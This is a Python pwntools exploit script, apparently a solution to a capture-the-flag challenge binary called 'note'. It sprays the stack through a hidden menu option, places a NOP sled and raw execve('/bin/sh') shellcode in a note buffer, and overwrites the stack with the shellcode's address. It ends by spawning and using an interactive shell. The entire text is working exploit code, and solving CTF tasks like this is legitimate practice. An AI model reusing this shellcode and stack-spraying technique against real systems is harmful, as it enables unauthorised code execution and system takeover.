# pwnWiz 
# 1. abuse stack 
# 2. write shell code
# 3. spray shellcode_addr
# 4. leave/ret -> jmp shellcode_addr

from pwn import *

context(arch = 'i386', os = 'linux')

s = process('./note')
e = ELF('./note')

stack = 0xffd53000

def create(command='0'):
	result = 0
	s.sendline('1')
	s.recvuntil('[')
	addr = int(s.recvuntil(']')[:-1], 16)
	if command == 'shell':
		print 'shell_addr: ' + str(hex(addr))
		return addr
	if addr >= stack:
		print str(hex(addr))
		result = 1
	s.recvuntil('exit\n')
	return result

def write(index, data):
	s.sendline('2')
	s.recvuntil('?\n')
	s.sendline(index)
	s.recvuntil('byte)\n')
	s.sendline(data)
	s.recvuntil('exit\n')

def read(index):
	s.sendline('3')
	s.recvuntil('?\n')
	s.sendline(index)
	s.recvuntil('exit\n')

def delete(index):
	s.sendline('4')
	s.recvuntil('?\n')
	s.sendline(index)
	s.recvuntil('exit\n')

def exit():
	s.sendline('5')
	s.recv()

def secret(payload):
	s.sendline('201527')
	s.recvuntil('this\n')
	s.sendline(payload)
	s.recvuntil('exit\n')

s.recvuntil('exit\n')

for i in range(2000):
	secret('A'*1024)

index = 0

for x in range(10):
	for i in range(255):
		result = create()
		if result:
			index = i
			break
	if result :
		break
	for i in range(255):
		delete(str(i))

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

shell_addr = create('shell')
#write(str(index+1), '\x90'*1000+asm(shellcraft.sh())+'\x00')
write(str(index+1), '\x90'*1000 + shellcode + '\x00')
write(str(index), p32(shell_addr)*1023)

exit()
s.sendline('id')
s.interactive()